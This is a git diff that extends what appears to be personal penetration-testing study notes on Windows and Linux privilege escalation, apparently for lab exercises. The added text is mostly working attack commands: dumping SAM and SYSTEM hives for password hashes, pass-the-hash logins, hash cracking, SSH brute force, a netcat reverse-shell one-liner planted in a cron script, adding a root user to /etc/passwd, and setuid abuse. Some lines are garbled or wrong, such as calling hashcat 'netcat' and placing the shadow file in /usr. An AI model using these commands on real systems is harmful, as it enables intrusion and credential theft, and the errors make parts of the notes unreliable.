@@ -1604,6 +1604,8 @@ Import-Module .\PowerUp.ps1
 get list of scheduled tasks
 ```
 schtasks /query /fo LIST /v
+
+schtasks /query /fo LIST /v | findstr "Taskname"
 ```
 
 ### Using Exploits
@@ -1625,3 +1627,233 @@ iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 
  Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer. Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer.
 
+also lookfor the privilege `SEBackupPrivilege` can be in the following steps
+
+https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+```
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+then transfer files to kali and use pypykatz to get hash
+```
+pypykatz registry --sam sam system
+```
+
+from here we can use evil-winmrm to pass hash (if allowed)
+```
+evil-winrm -i 192.168.1.41 -u raj -H "##Hash##"
+```
+
+or use netcat to crack the hash
+```
+hashcat -m 1000 a.pass /usr/share/wordlists/rockyou.txt
+```
+
+## Linux Privilege Escalation
+### Manual Enumeration
+to show uid and groups you are a part of
+
+```
+id
+```
+for all users look at etc/passwd
+x in /etc/passwd means the password is in /usr/shadow
+```
+cat /etc/passwd
+```
+system services are configured with the /usr/sbin/nologin home folder, where the nologin statement is used to block any remote or local login for service accounts.
+
+host nae
+```
+hostname
+```
+
+The /etc/issue and /etc/*-release files contain information about the operating system release and version. We can also run the uname -a command:
+```
+cat /etc/issue
+cat /etc/os-release
+uname -a
+```
+
+processes
+```
+ps aux
+```
+
+network interfaces
+```
+ip a
+
+ifconfig
+```
+
+routing tables
+```
+route
+
+routel
+```
+
+Finally, we can display active network connections and listening ports using either netstat12 or ss,13 both of which accept the same arguments.
+```
+ss -anp
+
+netstat -anp
+```
+
+firewall rules (often need root priv)
+```
+cat /etc/iptables/rules.v4
+```
+
+scheduled cron tasks
+```
+ls -lah /etc/cron*
+```
+
+to list cron tasks
+```
+crontab -l
+
+sudo crontab -l
+```
+
+list packages
+```
+dpkg -l
+```
+
+can use find command to find files or directories with misconfigured permissions
+```
+find / -writable -type d 2>/dev/null
+```
+
+use mount to list all file systems
+/etc/fstab looks all drives mounted at boot
+```
+mount
+cat /etc/fstab
+```
+
+view all disks
+```
+lsblk
+```
+
+list kernel modules
+```
+lsmod
+```
+
+to find out more info use /sbin/modinfo on module name
+```
+/sbin/modinfo $module_name
+```
+find set uid sticky bit binaries
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+### Automated Enumeration
+
+unix-privesc-check
+```
+unix-privesc-check
+unix-privesc-check standard > output.txt
+```
+
+There are many other tools worth mentioning that are specifically tailored for Linux privilege escalation information gathering, including LinEnum3 and LinPeas,4 which have been actively developed and enhanced over recent years.
+
+### User Trails
+
+```
+env
+cat .bashrc
+```
+
+can use crunch command to generate a wordlist with a pattern
+We'll set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first three characters to Lab followed by three numeric digits.
+```
+crunch 6 6 -t Lab%%% > wordlist
+```
+
+then can brute force with hydra
+```
+hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
+```
+
+list sudo privs with
+```
+sudo -l
+```
+
+can elevate to root using
+```
+sudo -i
+```
+
+### Service Footprints
+
+use watch to run ps -aux every second
+```
+watch -n 1 "ps -aux | grep pass"
+```
+
+tcpdump to capture network traffic
+Let's try to capture traffic in and out of the loopback interface, then dump its content in ASCII using the -A parameter. Ultimately, we want to filter any traffic containing the "pass" keyword.
+
+```
+sudo tcpdump -i lo -A | grep "pass"
+```
+
+### Abusing cron jobs
+
+can inspect the ccron log file
+```
+grep "CRON" /var/log/syslog
+```
+
+reverse shell one-liner to replace cron script
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.235 4444 >/tmp/f" >> user_backups.sh
+````
+
+### Abusing password auth
+can add password hash to /etc/passwd
+
+```
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+
+### Abusing Setuid
+
+serach for process 
+```
+ps u -C passwd
+```
+
+or can use proc
+```
+grep Uid /proc/1932/status
+```
+
+if th `find` utility jas setuid
+ If the -p option is supplied at startup, the effective user id is not reset. 
+```
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+```
+
+can also abuse privileges via capabilities
+```
+/usr/sbin/getcap -r / 2>/dev/null
+```
+
+https://gtfobins.github.io/ to find exploitable binaries
+
+```
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
